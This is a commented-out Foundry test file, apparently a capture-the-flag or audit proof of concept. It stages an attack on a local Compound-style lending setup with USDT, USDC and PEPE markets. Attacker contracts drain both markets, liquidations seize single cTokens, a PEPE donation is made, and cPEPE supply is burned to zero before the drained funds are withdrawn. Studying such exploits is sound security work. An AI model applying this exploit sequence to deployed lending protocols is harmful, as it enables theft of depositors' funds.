// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";
// import "../src/Comptroller.sol";
// import "../src/SimplePriceOracle.sol";
// import "../src/JumpRateModelV2.sol";
// import "../src/USDT.sol";
// import "../src/USDC.sol";
// import "../src/PEPE.sol";

// import "../src/Interfaces/IERC3156FlashBorrower.sol";
// import "../src/Interfaces/IERC20.sol";

// //0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496 foundry test address
// contract CompoundTest is Test {

//     Comptroller public comp;
//     SimplePriceOracle oracle;
//     JumpRateModelV2 rateModel;
//     USDT public usdt;
//     USDC public usdc;
//     PEPE public pepe;
//     CErc20 public cUSDT;
//     CErc20 public cUSDC;
//     CErc20 public cPEPE;

//     Attacker1 attacker1;
//     Attacker2 attacker2;

//     address public admin    = makeAddr("admin");
//     address user1           = makeAddr("user1");        //legal user fills liquidity
//     address attacker0       = makeAddr("attacker0");    //eoa attacker, for operating other SC's constrolled by attacker
//     address liquidator      = makeAddr("liquidator");   //acc controlled by attacker

//     uint256 public donateAmount = 1_000_000e18; //amount of PEPE will be donated by attacker

//     function setUp() public {

//         vm.startPrank(admin);
//         usdt            = new USDT("USDT","USDT",18);
//         usdc            = new USDC("USDC","USDC",18);
//         pepe            = new PEPE("PEPE","PEPE",18);
//         comp            = new Comptroller();
//         oracle          = new SimplePriceOracle();
//         rateModel       = new JumpRateModelV2(67664919673264820,0,953226247647620500,9e17,admin);
//         cUSDT           = new CErc20();
//         cUSDC           = new CErc20();
//         cPEPE           = new CErc20();

//         vm.stopPrank();

//         vm.startPrank(address(0));
//         cUSDT.initialize(address(usdt),comp,rateModel,0.02e28,"cUSDT","cUSDT",8);
//         cUSDC.initialize(address(usdc),comp,rateModel,0.02e28,"cUSDC","cUSDC",8);
//         cPEPE.initialize(address(pepe),comp,rateModel,0.02e28,"cPEPE","cPEPE",8);

//         vm.startPrank(admin);
//         oracle.setDirectPrice(address(usdt),1e18);
//         oracle.setDirectPrice(address(usdc),1e18);
//         oracle.setDirectPrice(address(pepe),1e18);
//         comp._setPriceOracle(oracle);
//         comp._supportMarket(cUSDT);
//         comp._supportMarket(cUSDC);
//         comp._supportMarket(cPEPE);
//         comp._setCollateralFactor(cUSDT,1e17*8); //80% CF
//         comp._setCollateralFactor(cUSDC,1e17*8); //80% CF
//         comp._setCollateralFactor(cPEPE,1e17*7); //70% CF
//         comp._setCloseFactor(5e17);
//         comp._setLiquidationIncentive(1080000000000000000); //1080000000000000000
//         vm.stopPrank();

//         setUPfillLiquidity(); //provide liquidity to markets;

//         deal(address(pepe),address(comp),donateAmount); //for donate purposes
//         deal(address(pepe),attacker0,200e18); //for minting and redeem consequently
//         deal(address(usdt),attacker0,1e9);    //main eoa attacker should send this to next account(liquidator) to liquidate than self;
//         deal(address(usdc),attacker0,1e9);    //main eoa attacker should send this to next account(liquidator) to liquidate than self;
//     }

//     function setUPfillLiquidity() public {

//         vm.startPrank(user1);
//         deal(address(usdt),user1,1000e18);
//         usdt.approve(address(cUSDT),type(uint256).max);
//         cUSDT.mint(1000e18);
//         vm.stopPrank();

//         vm.startPrank(user1);
//         deal(address(usdc),user1,1000e18);
//         usdc.approve(address(cUSDC),type(uint256).max);
//         cUSDC.mint(1000e18);
//         vm.stopPrank();
//     }

//     function testSolution() public {

//         console2.log(StdStyle.red("- --Balances before attack---"));
//         consoleMe();

//         //==attack cUSDT market==
//         vm.startPrank(attacker0);
//         attacker1       = new Attacker1();

//         pepe.transfer(address(attacker1),pepe.balanceOf(attacker0)/2);
//         attacker1.drainUSDTMarket();
//         usdt.transfer(liquidator,usdt.balanceOf(attacker0));

//         // let's liquidate attacker's 1000USDT borrow - 1cPEPE collateral
//         vm.startPrank(liquidator);
//         usdt.approve(address(cUSDT),type(uint256).max);
//         cUSDT.liquidateBorrow(address(attacker1), 1e9/2,cPEPE); //1_000_000_000/2: num to transfer exactly 1 seized cToken from attacker
//         cPEPE.redeem(1); //burn cPEPE to make totalSupply = 0;
//         console2.log(StdStyle.red("---Balances after liquidate USDT attacker---"));
//         consoleMe();
//         vm.stopPrank();

//         //==attack cUSDC market==
//         vm.startPrank(attacker0);
//         attacker2       = new Attacker2();
//         pepe.transfer(address(attacker2),pepe.balanceOf(attacker0));
//         attacker2.drainUSDCMarket();
//         usdc.transfer(liquidator,usdc.balanceOf(attacker0));
//         console2.log(StdStyle.red("- --Balances after cUSDC attack---"));
//         consoleMe();
//         vm.stopPrank();

//         // let's liquidate attacker's 1000USDC borrow - 1cPEPE collateral
//         vm.startPrank(liquidator);

//         usdc.approve(address(cUSDC),type(uint256).max);
//         cUSDC.liquidateBorrow(address(attacker2), 1e9/2,cPEPE); //1_000_000_000/2: num to transfer exactly 1 seized cToken from attacker
//         cPEPE.redeem(1); //burn cPEPE to make totalSupply = 0;
//         console2.log(StdStyle.red("---Balances after liquidate USDC attacker---"));
//         consoleMe();
//         vm.stopPrank();

//         //attacker0 train balances from attacker1 and attacker2 SC's;
//         vm.startPrank(attacker0);
//         attacker1.withdrawBalances();
//         attacker2.withdrawBalances();

//         console2.log(StdStyle.red("---Balances after withdraw drained funds to eoa---"));
//         consoleMe();

//     }

//     function consoleMe() public {
//         emit log_named_decimal_uint("attacker0    PEPE balance:               ", pepe.balanceOf(attacker0), pepe.decimals());
//         // emit log_named_decimal_uint("attacker0   cPEPE balance:               ", cPEPE.balanceOf(attacker0), cPEPE.decimals());
//         emit log_named_decimal_uint("attacker0    USDT balance:               ", usdt.balanceOf(attacker0), usdt.decimals());
//         emit log_named_decimal_uint("attacker0    USDC balance:               ", usdc.balanceOf(attacker0), usdc.decimals());

//         emit log_named_decimal_uint("attacker1    PEPE balance:               ", pepe.balanceOf(address(attacker1)), pepe.decimals());
//         // emit log_named_decimal_uint("attacker1   cPEPE balance:               ", cPEPE.balanceOf(address(attacker1)), cPEPE.decimals());
//         emit log_named_decimal_uint("attacker1    USDT balance:               ", usdt.balanceOf(address(attacker1)), usdt.decimals());
//         emit log_named_decimal_uint("attacker1    USDC balance:               ", usdc.balanceOf(address(attacker1)), usdc.decimals());

//         emit log_named_decimal_uint("attacker2    PEPE balance:               ", pepe.balanceOf(address(attacker2)), pepe.decimals());
//         // emit log_named_decimal_uint("attacker2   cPEPE balance:               ", cPEPE.balanceOf(address(attacker2)), cPEPE.decimals());
//         emit log_named_decimal_uint("attacker2    USDT balance:               ", usdt.balanceOf(address(attacker2)), usdt.decimals());
//         emit log_named_decimal_uint("attacker2    USDC balance:               ", usdc.balanceOf(address(attacker2)), usdc.decimals());
//   }

// }
